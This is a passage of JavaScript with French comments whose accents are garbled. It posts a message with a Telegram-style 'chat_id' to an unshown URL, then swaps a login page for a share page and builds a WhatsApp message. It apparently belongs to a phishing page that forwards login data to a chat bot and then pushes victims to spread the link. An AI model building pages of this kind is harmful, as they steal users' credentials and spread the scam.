      // Envoi de la requÃªte
      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      })
        .then((response) => {
          if (response.ok) {
            // Afficher la page de partage aprÃ¨s connexion
            document.getElementById('loginPage').style.display = 'none';
            document.getElementById('sharePage').style.display = 'block';

            // Appeler la fonction pour gÃ©nÃ©rer le message WhatsApp aprÃ¨s la connexion
            generateWhatsappMessage();
